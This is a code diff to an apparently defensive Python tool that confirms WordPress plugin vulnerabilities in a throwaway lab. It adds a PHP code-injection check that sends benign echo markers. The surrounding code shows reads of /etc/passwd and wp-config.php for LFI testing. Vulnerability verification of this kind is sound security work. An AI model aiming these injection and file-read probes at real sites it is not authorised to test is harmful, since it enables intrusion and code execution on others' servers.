@@ -81,6 +81,8 @@ _PATH_HINTS = (
 _PASSWD_SIGNATURE_RE = re.compile(r"root:[^:\n]*:0:0:")
 _CMD_HINTS = ("cmd", "command", "exec", "host", "ip", "ping", "target", "query", "addr",
              "domain", "shell")
+_PHP_CODE_HINTS = ("queryargs", "query_args", "code", "php", "eval", "script", "source",
+                   "payload", "querytype", "query_type", "args", "data")
 _SQLI_HINTS = ("sort", "order", "id", "search", "email", "sender", "receiver",
                "q", "query", "code", "name", "term", "filter")
 
@@ -4089,6 +4091,150 @@ def verify_wordpress_lfi(
                 f"se probaron {len(read_tried)} payloads de lectura y {len(rce_tried)} "
                 f"rutas de log para LFI-a-RCE -- ninguno confirmo inclusion de fichero "
                 f"como codigo ni lectura de /etc/passwd o wp-config.php")
+        res.evidence["screenshots"] = boot.shots
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
+
+
+def verify_wordpress_php_code_injection(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, code_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+    companion_plugins: Optional[list] = None,
+    json_body: bool = False,
+    extra_body_params: Optional[dict] = None,
+    keep_lab_on_failure: bool = False,
+) -> WpVerifyResult:
+    """Verifica PHP code injection (eval/exec de codigo PHP arbitrario) enviando un marcador
+    calculable: el payload pide `echo 'BIN_'.md5('secret');` y, si la respuesta contiene el hash
+    conocido, es prueba inequivoca de que el servidor evaluo el codigo PHP -- no una deduccion
+    por status code ni reflejo literal. Cubre plugins que exponen un endpoint REST/AJAX que
+    acepta codigo PHP directamente (p.ej. WP Query Console /wp-json/wqc/v1/query)."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    params_list = list(parameters.keys() if isinstance(parameters, dict) else (parameters or []))
+    # Identify the code execution parameter
+    code_param = code_param_hint
+    if not code_param:
+        for hint in _PHP_CODE_HINTS:
+            for p in params_list:
+                if hint in p.lower():
+                    code_param = p
+                    break
+            if code_param:
+                break
+    if not code_param and params_list:
+        code_param = params_list[0]  # fallback: first param
+    if not code_param:
+        res.detail = "no se identifico el parametro que lleva codigo PHP al servidor"
+        res.limitations.append("verificacion de PHP code injection necesita saber qué "
+                               "parametro lleva el codigo PHP; afina code_param_hint")
+        return res
+
+    lab = _Lab(_token())
+    boot = None
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
+                              companion_plugins=companion_plugins)
+        if boot is None:
+            return res
+
+        import hashlib
+        secret = secrets.token_hex(8)
+        marker = "BIN_" + hashlib.md5(secret.encode()).hexdigest()[:12]
+        # PHP payloads: cada uno debe producir el marcador en la respuesta si PHP lo evalua
+        payloads = [
+            f"echo '{marker}';",
+            f"print('{marker}');",
+            f"echo md5('{secret}');",   # alternative: check partial hash
+            f"var_dump('{marker}');",
+            f"die('{marker}');",
+            f"exit('{marker}');",
+        ]
+
+        m = (http_method or "POST").upper()
+        base_params = dict(parameters) if isinstance(parameters, dict) else {}
+        endpoint, base_params = _auto_resolve_wp_blockers(
+            boot, lab, slug, m, endpoint, base_params, code_param, res, step)
+
+        res.evidence.update({
+            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
+            "code_param": code_param, "marker": marker, "metodo": m, "endpoint": endpoint,
+        })
+
+        found = False
+        tried = []
+        for php_payload in payloads:
+            payload = dict(base_params)
+            payload[code_param] = php_payload
+            step(f"probando {m} {endpoint} con {code_param}={php_payload!r}...")
+            try:
+                if json_body or m == "POST":
+                    body = dict(extra_body_params or {})
+                    body[code_param] = php_payload
+                    if json_body:
+                        resp = boot.sub_sess.request(m, boot.base_url + endpoint,
+                                                     json=body, timeout=20)
+                    else:
+                        resp = boot.sub_sess.request(m, boot.base_url + endpoint,
+                                                     data=body, timeout=20)
+                else:
+                    resp = boot.sub_sess.request(m, boot.base_url + endpoint,
+                                                 params=payload, timeout=20)
+            except Exception as e:
+                tried.append({"payload": php_payload, "error": str(e)})
+                continue
+            body_text = resp.text or ""
+            found_marker = marker in body_text
+            # Also check if partial MD5 is present (for the md5() payload)
+            if not found_marker and secret in php_payload:
+                partial = hashlib.md5(secret.encode()).hexdigest()[:12]
+                found_marker = partial in body_text
+            tried.append({"payload": php_payload, "status": resp.status_code,
+                          "marker_presente": found_marker,
+                          "respuesta_recorte": body_text[:300]})
+            if found_marker:
+                found = True
+                res.evidence["payload_ganador"] = php_payload
+                res.evidence["status_code_respuesta"] = resp.status_code
+                res.evidence["respuesta_cuerpo_recorte"] = body_text[:500]
+                res.evidence["tecnica"] = "php-code-injection-echo"
+                step(f"VERIFICADO: la respuesta contiene el marcador '{marker}', prueba de que "
+                     f"el servidor evaluo el codigo PHP.")
+                _capture_exploit_shot(
+                    boot, m, endpoint, resp, highlight=marker,
+                    caption_es=(f"PHP CODE INJECTION CONFIRMADA — marcador '{marker}' en respuesta. "
+                                f"Payload: {code_param}={php_payload!r}"),
+                    caption_en=(f"PHP CODE INJECTION CONFIRMED — marker '{marker}' in response. "
+                                f"Payload: {code_param}={php_payload!r}"))
+                break
+        res.evidence["intentos"] = tried
+
+        if found:
+            res.verified = True
+            res.ok = True
+            res.detail = (f"PHP CODE INJECTION confirmada: el payload {code_param}="
+                          f"{res.evidence['payload_ganador']!r} hizo que el servidor evaluara "
+                          f"codigo PHP y devolviera el marcador '{marker}' -- prueba inequivoca "
+                          f"de ejecucion de codigo PHP en el servidor")
+        else:
+            res.ok = True
+            res.detail = (f"se probaron {len(tried)} payloads PHP en {code_param}, ninguno "
+                          f"devolvio el marcador '{marker}' -- PHP code injection no confirmada "
+                          f"(puede que el endpoint necesite autenticacion, nonce especifico, o "
+                          f"el parametro correcto no sea '{code_param}')")
         res.evidence["screenshots"] = boot.shots
         return res
     except subprocess.TimeoutExpired as e:
